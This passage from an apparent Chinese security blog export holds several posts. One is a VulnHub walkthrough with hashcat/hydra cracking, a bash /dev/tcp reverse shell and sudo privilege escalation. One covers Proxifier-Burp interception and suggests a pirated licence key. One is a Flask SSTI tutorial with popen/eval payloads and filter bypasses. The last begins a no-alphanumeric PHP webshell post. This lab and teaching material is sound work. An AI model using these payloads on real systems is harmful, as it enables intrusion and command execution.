class=\"line\"><span class=\"title function_ invoke__\">define</span>(<span class=\"string\">&#x27;LOGGED_IN_SALT&#x27;</span>,   <span class=\"string\">&#x27;#`F9&amp;pm_jY&#125;N3y0&amp;8Z]EeL)z,$39,yFc$Nq`jGOMT_aM*`&lt;$9A:9&lt;Kk^L&#125;fX@+iZ&#x27;</span>);</span><br><span class=\"line\"><span class=\"title function_ invoke__\">define</span>(<span class=\"string\">&#x27;NONCE_SALT&#x27;</span>,       <span class=\"string\">&#x27;hTlFE*6zlZMbqluz)hf:-:x-:l89fC4otci;38|i`7eU1;+k[!0[ZG.oCt2@-y3X&#x27;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/**#@-*/</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * WordPress database table prefix.</span></span><br><span class=\"line\"><span class=\"comment\"> *</span></span><br><span class=\"line\"><span class=\"comment\"> * You can have multiple installations in one database if you give each</span></span><br><span class=\"line\"><span class=\"comment\"> * a unique prefix. Only numbers, letters, and underscores please!</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"variable\">$table_prefix</span> = <span class=\"string\">&#x27;wp_&#x27;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * For developers: WordPress debugging mode.</span></span><br><span class=\"line\"><span class=\"comment\"> *</span></span><br><span class=\"line\"><span class=\"comment\"> * Change this to true to enable the display of notices during development.</span></span><br><span class=\"line\"><span class=\"comment\"> * It is strongly recommended that plugin and theme developers use WP_DEBUG</span></span><br><span class=\"line\"><span class=\"comment\"> * in their development environments.</span></span><br><span class=\"line\"><span class=\"comment\"> *</span></span><br><span class=\"line\"><span class=\"comment\"> * For information on other constants that can be used for debugging,</span></span><br><span class=\"line\"><span class=\"comment\"> * visit the documentation.</span></span><br><span class=\"line\"><span class=\"comment\"> *</span></span><br><span class=\"line\"><span class=\"comment\"> * <span class=\"doctag\">@link</span> https://wordpress.org/support/article/debugging-in-wordpress/</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"title function_ invoke__\">define</span>( <span class=\"string\">&#x27;WP_DEBUG&#x27;</span>, <span class=\"literal\">false</span> );</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/* Add any custom values between this line and the &quot;stop editing&quot; line. */</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/* That&#x27;s all, stop editing! Happy publishing. */</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/** Absolute path to the WordPress directory. */</span></span><br><span class=\"line\"><span class=\"keyword\">if</span> ( ! <span class=\"title function_ invoke__\">defined</span>( <span class=\"string\">&#x27;ABSPATH&#x27;</span> ) ) &#123;</span><br><span class=\"line\">\t<span class=\"title function_ invoke__\">define</span>( <span class=\"string\">&#x27;ABSPATH&#x27;</span>, <span class=\"keyword\">__DIR__</span> . <span class=\"string\">&#x27;/&#x27;</span> );</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/** Sets up WordPress vars and included files. */</span></span><br><span class=\"line\"><span class=\"keyword\">require_once</span> ABSPATH . <span class=\"string\">&#x27;wp-settings.php&#x27;</span>;</span><br></pre></td></tr></table></figure>\n\n<p>获取到数据库的密码<code>R3v_m4lwh3r3_k1nG!!</code>，账户为<code>john</code>，而账户里面有<code>john</code></p>\n<p><img src=\"/images/red/image-20230608235127511.png\" alt=\"image-20230608235127511\"></p>\n<h3 id=\"破解密码\"><a href=\"#破解密码\" class=\"headerlink\" title=\"破解密码\"></a>破解密码</h3><p>将密码保存到文件当中，然后使用<code>hashcat</code>的规则进行破解</p>\n<blockquote>\n<p>hashcat –stdout pass.txt -r &#x2F;usr&#x2F;share&#x2F;hashcat&#x2F;rules&#x2F;best64.rule &gt; passlist.txt</p>\n</blockquote>\n<p><img src=\"/images/red/image-20230608235732613.png\" alt=\"image-20230608235732613\"></p>\n<p>然后使用<code>hydra</code>爆破ssh密码</p>\n<blockquote>\n<p>hydra -l john -P passlist.txt 10.0.2.8 ssh</p>\n</blockquote>\n<p><img src=\"/images/red/image-20230608235825582.png\" alt=\"image-20230608235825582\"></p>\n<h2 id=\"内网渗透\"><a href=\"#内网渗透\" class=\"headerlink\" title=\"内网渗透\"></a>内网渗透</h2><h3 id=\"信息收集-1\"><a href=\"#信息收集-1\" class=\"headerlink\" title=\"信息收集\"></a>信息收集</h3><p>使用ssh进行登录，然后会发现<code>cat</code>命令被替换为了<code>vi</code>，而<code>vi</code>被替换为了<code>cat</code>，这个shell也是不稳定的，所以这里可以使用bash反弹shell</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">本地监听端口：nc -lvnp 1234</span><br><span class=\"line\">靶机执行反弹shell命令：bash -c &#x27;bash -i &gt;&amp; /dev/tcp/10.0.2.15/1234 0&gt;&amp;1&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\">因为这里这个shell不好用，所以可以使用python升级shell</span><br><span class=\"line\">python3 -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br><span class=\"line\">export TERM=xterm</span><br><span class=\"line\"></span><br><span class=\"line\">然后Crtl+Z，再执行下面的命令</span><br><span class=\"line\">stty raw -echo;fg;</span><br><span class=\"line\"></span><br><span class=\"line\">最后输入下面的命令回车</span><br><span class=\"line\">reset</span><br></pre></td></tr></table></figure>\n\n<p>使用<code>sudo -l</code>查看权限发现会以<code>ippsec</code>去执行<code>/usr/bin/time</code>命令</p>\n<p><img src=\"/images/red/image-20230609000724878.png\" alt=\"image-20230609000724878\"></p>\n<p>所以这里可以提权，使用<code>sudo -u ippsec /usr/bin/time /bin/bash</code></p>\n<p>再次使用上面的python命令进行升级shell</p>\n<p><img src=\"/images/red/image-20230609001140040.png\" alt=\"image-20230609001140040\"></p>\n<h3 id=\"提权\"><a href=\"#提权\" class=\"headerlink\" title=\"提权\"></a>提权</h3><p>使用<a href=\"https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy64s\">pspy64s</a>进行检查</p>\n<blockquote>\n<p>wget  <a href=\"https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy64s\">https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy64s</a></p>\n</blockquote>\n<p><img src=\"/images/red/image-20230609001426059.png\" alt=\"image-20230609001426059\"></p>\n<p>然后增加执行权限并运行</p>\n<p><img src=\"/images/red/image-20230609001524980.png\" alt=\"image-20230609001524980\"></p>\n<p><img src=\"/images/red/image-20230609001833844.png\" alt=\"image-20230609001833844\"></p>\n<p>进入该目录下面，然后查看其内容</p>\n<blockquote>\n<p>cd &#x2F;var&#x2F;www&#x2F;wordpress&#x2F;.git&#x2F;</p>\n<p>vi supersecretfileuc.c</p>\n</blockquote>\n<p><img src=\"/images/red/image-20230609001924443.png\" alt=\"image-20230609001924443\"></p>\n<p>这里经常会跳这些内容，说明会定时执行，所以我们可以使用一个C的反弹shell：<a href=\"https://www.revshells.com/\">https://www.revshells.com/</a></p>\n<p><img src=\"/images/red/image-20230609002133937.png\" alt=\"image-20230609002133937\"></p>\n<p><img src=\"/images/red/image-20230609002206170.png\" alt=\"image-20230609002206170\"></p>\n<p>然后使用python的http服务，让靶机下载这个文件（靶机上的这个文件删除掉，下面的shell又断掉了，会导致格式有点难看）</p>\n<p><img src=\"/images/red/image-20230609002351376.png\" alt=\"image-20230609002351376\"></p>\n<p><img src=\"/images/red/image-20230609002432711.png\" alt=\"image-20230609002432711\"></p>\n<p>然后使用<code>rlwrap nc -lvnp 9001</code>监听，这里我们可以使用gcc自己去执行（如果你不想等待的话）</p>\n<p><img src=\"/images/red/image-20230609002636278.png\" alt=\"image-20230609002636278\"></p>\n<p>成功提权</p>\n<p><img src=\"/images/red/image-20230609002700730.png\" alt=\"image-20230609002700730\"></p>\n<p><img src=\"/images/red/image-20230609002730825.png\" alt=\"image-20230609002730825\"></p>\n","categories":["vulnhub"],"tags":["vulnhub","内网"]},{"title":"proxifier+burp小程序代理","url":"/2024/07/17/proxifier-burp%E5%B0%8F%E7%A8%8B%E5%BA%8F%E4%BB%A3%E7%90%86/","content":"<p>下载proxifier软件，然后在网上找个注册码，否则只能使用一个月。</p>\n<p>然后先开启HTTP服务器代理</p>\n<p><img src=\"/images/proxifier-burp%E5%B0%8F%E7%A8%8B%E5%BA%8F%E4%BB%A3%E7%90%86/1.jpg\"></p>\n<p><img src=\"/images/proxifier-burp%E5%B0%8F%E7%A8%8B%E5%BA%8F%E4%BB%A3%E7%90%86/2.jpg\"></p>\n<p>然后设置代理服务器，要跟burp的端口一致</p>\n<p><img src=\"/images/proxifier-burp%E5%B0%8F%E7%A8%8B%E5%BA%8F%E4%BB%A3%E7%90%86/3.jpg\"></p>\n<p><img src=\"/images/proxifier-burp%E5%B0%8F%E7%A8%8B%E5%BA%8F%E4%BB%A3%E7%90%86/4.jpg\"></p>\n<p>最后设置规则即可</p>\n<p><img src=\"/images/proxifier-burp%E5%B0%8F%E7%A8%8B%E5%BA%8F%E4%BB%A3%E7%90%86/5.jpg\"></p>\n<p><img src=\"/images/proxifier-burp%E5%B0%8F%E7%A8%8B%E5%BA%8F%E4%BB%A3%E7%90%86/6.jpg\"></p>\n<p>这里的<code>WeChatAppEx.exe</code>路径在</p>\n<p><code>C:\\Users\\用户名\\AppData\\Roaming\\Tencent\\WeChat\\XPlugin\\Plugins\\RadiumWMPF\\9185\\extracted\\runtime</code>下面</p>\n<p><img src=\"/images/proxifier-burp%E5%B0%8F%E7%A8%8B%E5%BA%8F%E4%BB%A3%E7%90%86/7.jpg\"></p>\n<p>就可以成功抓包了</p>\n<p><img src=\"/images/proxifier-burp%E5%B0%8F%E7%A8%8B%E5%BA%8F%E4%BB%A3%E7%90%86/9.png\"></p>\n<p>优势：使用全局代理太过于麻烦，然后会抓取所有软件的流量，设置规则太过于麻烦，所以使用proxifier代理会比较专注于某一应用，流量分析会比较简单。</p>\n","categories":["web安全学习"],"tags":["web","安全","SRC"]},{"title":"flask之ssti模板注入知识点及复现","url":"/2022/09/11/flask%E4%B9%8Bssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E7%9F%A5%E8%AF%86%E7%82%B9%E5%8F%8A%E5%A4%8D%E7%8E%B0/","content":"<p>原创文章：</p>\n<ul>\n<li><a href=\"https://xz.aliyun.com/t/3679\">先知社区——小猪佩奇</a></li>\n<li><a href=\"https://www.freebuf.com/articles/web/260504.html\">FreeBuf——DeceaseWolf</a></li>\n</ul>\n<h3 id=\"鸣谢\"><a href=\"#鸣谢\" class=\"headerlink\" title=\"鸣谢\"></a>鸣谢</h3><p>首先还是感谢两位师傅的文章，受益匪浅！本文主要是转载和自我学习。</p>\n<h3 id=\"SSTI模板注入的成因\"><a href=\"#SSTI模板注入的成因\" class=\"headerlink\" title=\"SSTI模板注入的成因\"></a>SSTI模板注入的成因</h3><p>SSTI服务端模板注入，SSTI主要为python的一些框架 jinja2、mako、tornado、django，PHP框架smarty、twig，以及Java的框架jade、velocity使用了渲染函数时，由于代码的不规范或者是开发者过分信赖用户输入而导致了服务端模板注入。</p>\n<h3 id=\"模板引擎\"><a href=\"#模板引擎\" class=\"headerlink\" title=\"模板引擎\"></a>模板引擎</h3><ul>\n<li><p>什么是模板引擎？我们为什么要使用模板？</p>\n<ul>\n<li>模板引擎可以让（网站）程序实现界面与数据分离，业务代码与逻辑代码的分离，可以大大提升开发效率，良好的设计也使得代码重用变得更加容易。</li>\n</ul>\n</li>\n<li><p>拿到数据之后，然后塞到模板中，再让渲染引擎将塞进去的东西生成html的文本发送给浏览器，这样可以提高效率。</p>\n</li>\n</ul>\n<h3 id=\"本地flask环境搭建\"><a href=\"#本地flask环境搭建\" class=\"headerlink\" title=\"本地flask环境搭建\"></a>本地flask环境搭建</h3><p>环境：3.10<br>工具：pycharm专业版</p>\n<ul>\n<li>首先新建项目</li>\n</ul>\n<p><img src=\"/images/flask%E4%B9%8Bssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E7%9F%A5%E8%AF%86%E7%82%B9%E5%8F%8A%E5%A4%8D%E7%8E%B0/%E5%9B%BE%E7%89%87-103-1024x542.png\" alt=\"img\"></p>\n<ul>\n<li>选择flask项目，点击创建</li>\n</ul>\n<p><img src=\"/images/flask%E4%B9%8Bssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E7%9F%A5%E8%AF%86%E7%82%B9%E5%8F%8A%E5%A4%8D%E7%8E%B0/%E5%9B%BE%E7%89%87-105-1024x539.png\" alt=\"img\"></p>\n<ul>\n<li>出现这样的界面</li>\n</ul>\n<p><img src=\"/images/flask%E4%B9%8Bssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E7%9F%A5%E8%AF%86%E7%82%B9%E5%8F%8A%E5%A4%8D%E7%8E%B0/%E5%9B%BE%E7%89%87-106-1024x542.png\" alt=\"img\"></p>\n<ul>\n<li>右键进行调试，如果出现报错的话，是因为你没有安装flask模块，使用<code>pip install flask</code>进行安装重新运行即可</li>\n</ul>\n<p><img src=\"/images/flask%E4%B9%8Bssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E7%9F%A5%E8%AF%86%E7%82%B9%E5%8F%8A%E5%A4%8D%E7%8E%B0/%E5%9B%BE%E7%89%87-107-1024x541.png\" alt=\"img\"></p>\n<ul>\n<li>访问指定链接，看到如下页面说明成功了</li>\n</ul>\n<p><img src=\"/images/flask%E4%B9%8Bssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E7%9F%A5%E8%AF%86%E7%82%B9%E5%8F%8A%E5%A4%8D%E7%8E%B0/%E5%9B%BE%E7%89%87-108-1024x97.png\" alt=\"img\"></p>\n<h3 id=\"route装饰器路由\"><a href=\"#route装饰器路由\" class=\"headerlink\" title=\"route装饰器路由\"></a>route装饰器路由</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">@app.route(&#x27;/&#x27;)</span><br></pre></td></tr></table></figure>\n\n<p>使用route()装饰器告诉Flask是什么样的URL才能触发我们的函数.route()装饰器把一个函数绑定到对应的URL上，这就相当于路由，一个路由会跟着一个函数：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">@app.route(<span class=\"params\"><span class=\"string\">&#x27;/&#x27;</span></span>) </span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">test</span>():</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"string\">&quot;123&quot;</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/flask%E4%B9%8Bssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E7%9F%A5%E8%AF%86%E7%82%B9%E5%8F%8A%E5%A4%8D%E7%8E%B0/%E5%9B%BE%E7%89%87-111-1024x544.png\" alt=\"img\"></p>\n<p>然后我们进行访问</p>\n<p><img src=\"/images/flask%E4%B9%8Bssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E7%9F%A5%E8%AF%86%E7%82%B9%E5%8F%8A%E5%A4%8D%E7%8E%B0/%E5%9B%BE%E7%89%87-112-1024x97.png\" alt=\"img\"></p>\n<p>我们在这里修改一下规则，使用下面的这段代码来设置动态网址</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">@app.route(<span class=\"params\"><span class=\"string\">&quot;/hello/&lt;username&gt;&quot;</span></span>) </span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">hello_user</span>(<span class=\"params\">username</span>): </span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"string\">&quot;user:%s&quot;</span> % username</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/flask%E4%B9%8Bssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E7%9F%A5%E8%AF%86%E7%82%B9%E5%8F%8A%E5%A4%8D%E7%8E%B0/%E5%9B%BE%E7%89%87-114-1024x106.png\" alt=\"img\"></p>\n<blockquote>\n<p>int 接受整数<br>float 接收浮点数<br>path 和默认的相似，但也接收斜线</p>\n</blockquote>\n<h3 id=\"main入口\"><a href=\"#main入口\" class=\"headerlink\" title=\"main入口\"></a>main入口</h3><p>当python文件运行的时候，在<code>if __name__ == &#39;__main__&#39;</code>下面的代码将会运行，当python文件被导入的时候，在<code>if __name__ == &#39;__main__&#39;</code>下面的代码将不会运行。</p>\n<blockquote>\n<p>测试的时候，我们可以使用debug，方便调试，增加一句：app.debug &#x3D; True</p>\n<p>这个可以让操作系统监听所有的公网IP，就可以在公网上面看到自己的web了：app.run(host&#x3D;’0.0.0.0’)</p>\n</blockquote>\n<h3 id=\"模板渲染\"><a href=\"#模板渲染\" class=\"headerlink\" title=\"模板渲染\"></a>模板渲染</h3><p>我们可以使用<code>render_template()</code>方法来渲染模板。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 模板渲染实例</span></span><br><span class=\"line\"><span class=\"keyword\">from</span> flask <span class=\"keyword\">import</span> render_template </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">@app.route(<span class=\"params\"><span class=\"string\">&#x27;/hello/&#x27;</span></span>) </span></span><br><span class=\"line\"><span class=\"meta\">@app.route(<span class=\"params\"><span class=\"string\">&#x27;/hello/&lt;name&gt;&#x27;</span></span>) </span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">hello</span>(<span class=\"params\">name=<span class=\"literal\">None</span></span>):</span><br><span class=\"line\">    <span class=\"keyword\">return</span> render_template(<span class=\"string\">&#x27;index.html&#x27;</span>, name=name)</span><br></pre></td></tr></table></figure>\n\n<p>html文件是放在<code>templates</code>文件夹当中的，然后我们放一个<code>index.html</code>到该文件夹当中</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;h1&gt;Hello, &#123;&#123;user.name&#125;&#125;!&lt;/h1&gt;</span><br></pre></td></tr></table></figure>\n\n<p>这里只放了一个参数进行渲染，然后我们在app.py文件中进行渲染</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">@app.route(<span class=\"params\"><span class=\"string\">&#x27;/&#x27;</span></span>)</span></span><br><span class=\"line\"><span class=\"meta\">@app.route(<span class=\"params\"><span class=\"string\">&#x27;/index&#x27;</span></span>) </span></span><br><span class=\"line\"><span class=\"comment\"># 我们访问/或者/index都会跳转 </span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">index</span>():</span><br><span class=\"line\">    user = &#123;<span class=\"string\">&#x27;name&#x27;</span>: <span class=\"string\">&#x27;小菜猴子&#x27;</span>&#125;</span><br><span class=\"line\">    <span class=\"comment\"># 传入一个字典数组 </span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> render_template(<span class=\"string\">&quot;index.html&quot;</span>, user=user)</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/flask%E4%B9%8Bssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E7%9F%A5%E8%AF%86%E7%82%B9%E5%8F%8A%E5%A4%8D%E7%8E%B0/%E5%9B%BE%E7%89%87-115-1024x149.png\" alt=\"img\"></p>\n<h3 id=\"flask-SSTI模板注入复现\"><a href=\"#flask-SSTI模板注入复现\" class=\"headerlink\" title=\"flask SSTI模板注入复现\"></a>flask SSTI模板注入复现</h3><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> flask <span class=\"keyword\">import</span> Flask, request, render_template_string </span><br><span class=\"line\"></span><br><span class=\"line\">app = Flask(__name__) </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">@app.route(<span class=\"params\"><span class=\"string\">&#x27;/test/&#x27;</span></span>) </span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">test</span>(): </span><br><span class=\"line\">    code = request.args.get(<span class=\"string\">&#x27;id&#x27;</span>)</span><br><span class=\"line\">    html = <span class=\"string\">&#x27;&#x27;&#x27; &lt;h3&gt;%s&lt;/h3&gt; &#x27;&#x27;&#x27;</span> % code</span><br><span class=\"line\">    <span class=\"keyword\">return</span> render_template_string(html) </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">&quot;__main__&quot;</span>: </span><br><span class=\"line\">    app.run()</span><br></pre></td></tr></table></figure>\n\n<p>输入<code>&#123;&#123;7*7&#125;&#125;</code>发现回显的是49，说明存在SSTI模板注入</p>\n<p><img src=\"/images/flask%E4%B9%8Bssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E7%9F%A5%E8%AF%86%E7%82%B9%E5%8F%8A%E5%A4%8D%E7%8E%B0/%E5%9B%BE%E7%89%87-116-1024x104.png\" alt=\"img\"></p>\n<p>然后我们使用<code>&#123;&#123;''.__class__&#125;&#125;</code>获取字符串的类对象</p>\n<p><img src=\"/images/flask%E4%B9%8Bssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E7%9F%A5%E8%AF%86%E7%82%B9%E5%8F%8A%E5%A4%8D%E7%8E%B0/%E5%9B%BE%E7%89%87-117-1024x94.png\" alt=\"img\"></p>\n<p>使用<code>&#123;&#123;''.__class__.__mro__&#125;&#125;</code>寻找基类</p>\n<p><img src=\"/images/flask%E4%B9%8Bssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E7%9F%A5%E8%AF%86%E7%82%B9%E5%8F%8A%E5%A4%8D%E7%8E%B0/%E5%9B%BE%E7%89%87-119-1024x108.png\" alt=\"img\"></p>\n<p>使用<code>&#123;&#123;''.__class__.__mro__[1].__subclasses__()&#125;&#125;</code>寻找可用的引用</p>\n<p><img src=\"/images/flask%E4%B9%8Bssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E7%9F%A5%E8%AF%86%E7%82%B9%E5%8F%8A%E5%A4%8D%E7%8E%B0/%E5%9B%BE%E7%89%87-120-1024x546.png\" alt=\"img\"></p>\n<p>然后我们使用下标的方式获取<code>os._wrap_close</code>，使用<code>&#123;&#123;''.__class__.__mro__[1].__subclasses__()[138]&#125;&#125;</code></p>\n<p><img src=\"/images/flask%E4%B9%8Bssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E7%9F%A5%E8%AF%86%E7%82%B9%E5%8F%8A%E5%A4%8D%E7%8E%B0/%E5%9B%BE%E7%89%87-121-1024x129.png\" alt=\"img\"></p>\n<p>然后我们利用<code>__init__.__globals__</code>来找os类下的所有方法及变量和参数。使用<code>&#123;&#123;''.__class__.__mro__[1].__subclasses__()[138].__init__.__globals__&#125;&#125;</code></p>\n<p><img src=\"/images/flask%E4%B9%8Bssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E7%9F%A5%E8%AF%86%E7%82%B9%E5%8F%8A%E5%A4%8D%E7%8E%B0/%E5%9B%BE%E7%89%87-122-1024x540.png\" alt=\"img\"></p>\n<p>我们发现这里有一个popen函数，然后我们使用他，poc为<code>&#123;&#123;''.__class__.__mro__[1].__subclasses__()[138].__init__.__globals__['popen']('dir').read()&#125;&#125;</code></p>\n<p><img src=\"/images/flask%E4%B9%8Bssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E7%9F%A5%E8%AF%86%E7%82%B9%E5%8F%8A%E5%A4%8D%E7%8E%B0/%E5%9B%BE%E7%89%87-123-1024x123.png\" alt=\"img\"></p>\n<h3 id=\"其他知识点\"><a href=\"#其他知识点\" class=\"headerlink\" title=\"其他知识点\"></a>其他知识点</h3><blockquote>\n<p>__base__ 以元组返回一个类直接所继承的类<br>__mro__ 以元组返回继承关系链<br>__class__ 返回对象所属的类<br>__globals__ 以dict返回函数所在模块命名空间中的所有变量<br>__subclasses__() 以列表返回类的子类<br>__init__ 类的初始化方法<br><em>builtin</em> 内建函数，python中可以直接运行一些函数，例如int(),list()等等，这些函数可以在__builtins__中可以查到。查看的方法是dir(__builtins__)</p>\n<p>ps：在py3中__builtin__被换成了builtin __builtin__ 和 __builtins__之间是什么关系呢？<br>在主模块main中，__builtins__是对内建模块__builtin__本身的引用，即__builtins__完全等价于__builtin__，二者完全是一个东西，不分彼此。<br>非主模块main中，__builtins__仅是对__builtin__.__dict__的引用，而非__builtin__本身</p>\n</blockquote>\n<h4 id=\"CTF中的一些绕过技巧\"><a href=\"#CTF中的一些绕过技巧\" class=\"headerlink\" title=\"CTF中的一些绕过技巧\"></a>CTF中的一些绕过技巧</h4><p>1、过滤[]等符号：使用gititem绕过。<br>如原poc <code>&#123;&#123;\"\".__class__.__bases__[0]&#125;&#125;</code>，绕过后<code>&#123;&#123;\"\".__class__.bases__.__getitem__(0)&#125;&#125;</code></p>\n<p>2、过滤了subclasses，使用拼凑法绕过<br>如原poc：</p>\n<p> <code>&#123;&#123;\"\".__class__.__bases__[0].__subclasses__()&#125;&#125;</code>，绕过后<code>&#123;&#123;\"\".__class__.bases[0]__'subcla'+'sses'&#125;&#125;</code></p>\n<p>3、过滤了class，使用session</p>\n<p><code> &#123;&#123;session['__cla'+'ss__'].__bases__[0].__bases__[0].__bases__[0].__bases__[0].__subclasses__()[118]&#125;&#125;</code><br>多个bases[0]是因为一直在向上找object类。使用mro就会很方便</p>\n<figure class=\"highlight txt\"><table><tr><td class=\"code\"><pre><span class=\"line\">&#123;&#123;session[&#x27;__cla&#x27;+&#x27;ss__&#x27;].__mro__[12]&#125;&#125;</span><br><span class=\"line\">或者</span><br><span class=\"line\">request[&#x27;__cl&#x27;+&#x27;ass__&#x27;].__mro__[12]&#125;&#125;</span><br></pre></td></tr></table></figure>\n\n<p>4、poc</p>\n<figure class=\"highlight txt\"><table><tr><td class=\"code\"><pre><span class=\"line\">().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.values()[13][&#x27;eval&#x27;](&#x27;__import__(&quot;os&quot;).popen(&quot;ls  /var/www/html&quot;).read()&#x27; )</span><br><span class=\"line\"></span><br><span class=\"line\">object.__subclasses__()[59].__init__.func_globals[&#x27;linecache&#x27;].__dict__[&#x27;o&#x27;+&#x27;s&#x27;].__dict__[&#x27;sy&#x27;+&#x27;stem&#x27;](&#x27;ls&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">&#123;&#123;request[&#x27;__cl&#x27;+&#x27;ass__&#x27;].__base__.__base__.__base__[&#x27;__subcla&#x27;+&#x27;sses__&#x27;]()[60][&#x27;__in&#x27;+&#x27;it__&#x27;][&#x27;__&#x27;+&#x27;glo&#x27;+&#x27;bal&#x27;+&#x27;s__&#x27;][&#x27;__bu&#x27;+&#x27;iltins__&#x27;][&#x27;ev&#x27;+&#x27;al&#x27;](&#x27;__im&#x27;+&#x27;port__(&quot;os&quot;).po&#x27;+&#x27;pen(&quot;ca&quot;+&quot;t a.php&quot;).re&#x27;+&#x27;ad()&#x27;)&#125;&#125;</span><br></pre></td></tr></table></figure>\n\n<p>再次感谢两位师傅的文章！</p>\n<p>如果文章有何不妥之处，请您指出。</p>\n","categories":["web安全学习"],"tags":["CTF","web","安全"]},{"title":"不包含字母和数字的webshell","url":"/2022/10/18/%E4%B8%8D%E5%8C%85%E5%90%AB%E5%AD%97%E6%AF%8D%E5%92%8C%E6%95%B0%E5%AD%97%E7%9A%84webshell/","content":"<p>转载自：</p>\n<p>[一些不包含数字和字母的webshell](<a href=\"https://www.leavesongs.com/PENETRATION/webshell-\">https://www.leavesongs.com/PENETRATION/webshell-</a><br>without-alphanum.html)</p>\n<p>[无字母数字webshell之提](<a href=\"https://www.leavesongs.com/PENETRATION/webshell-without-\">https://www.leavesongs.com/PENETRATION/webshell-without-</a><br>alphanum-advanced.html)[高篇](<a href=\"https://www.leavesongs.com/PENETRATION/webshell-\">https://www.leavesongs.com/PENETRATION/webshell-</a><br>without-alphanum-advanced.html)</p>\n<p>首先感谢离别歌师傅的文章，有兴趣的小伙伴可以关注一下离别歌师傅的个人博客：<a href=\"https://www.leavesongs.com/\">离别歌</a></p>\n<h2 id=\"目录\"><a href=\"#目录\" class=\"headerlink\" title=\"目录\"></a>目录</h2><ul>\n<li>基础篇<ul>\n<li>一、提出问题</li>\n<li>二、思路</li>\n<li>三、方法一</li>\n<li>四、方法二</li>\n<li>五、方法三</li>\n</ul>\n</li>\n<li>提高篇<ul>\n<li>PHP7下绕过</li>\n</ul>\n</li>\n</ul>\n<h1 id=\"基础篇\"><a href=\"#基础篇\" class=\"headerlink\" title=\"基础篇\"></a>基础篇</h1><h3 id=\"一、提出问题\"><a href=\"#一、提出问题\" class=\"headerlink\" title=\"一、提出问题\"></a>一、提出问题</h3><p>如何编写一个不使用字母和数字的webshell？</p>\n<pre><code>&lt;?php\nhighlight_file(__FILE__);\nif (!preg_match(&#39;/[a-z0-9]/is&#39;, $_GET[&#39;shell&#39;])) &#123;\n    eval($_GET[&#39;shell&#39;]);\n&#125; else &#123;\n    echo &quot;hacker&quot;;\n&#125;\n</code></pre>\n<h3 id=\"二、思路\"><a href=\"#二、思路\" class=\"headerlink\" title=\"二、思路\"></a>二、思路</h3><p>使用非数字、字母的字符进行变换来得到字母和数字。</p>\n<h3 id=\"三、方法一\"><a href=\"#三、方法一\" class=\"headerlink\" 